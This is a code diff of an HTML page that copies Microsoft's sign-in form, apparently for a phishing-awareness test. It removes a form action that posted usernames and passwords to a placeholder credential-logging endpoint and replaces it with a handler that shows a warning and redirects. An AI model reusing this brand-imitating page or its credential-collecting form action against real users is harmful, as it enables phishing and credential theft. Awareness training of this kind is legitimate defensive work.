@@ -10,7 +10,7 @@
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
         <h2>Sign in</h2>
-        <form action="https://your-backend.com/api/log-credentials" method="POST" onsubmit="showWarning(event)">
+        <form id="login-form">
             <input type="email" name="username" placeholder="Email, phone, or Skype" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Sign in</button>
@@ -21,11 +21,11 @@
     </div>
 
     <script>
-        function showWarning(event) {
+        document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault();
             alert("⚠ This is a phishing awareness test. DO NOT enter your real credentials.");
-            window.location.href = "https://security.microsoft.com"; // Redirect to real Microsoft Security page
-        }
+            window.location.href = "https://security.microsoft.com"; // Redirect to Microsoft Security page
+        });
     </script>
 </body>
 </html>
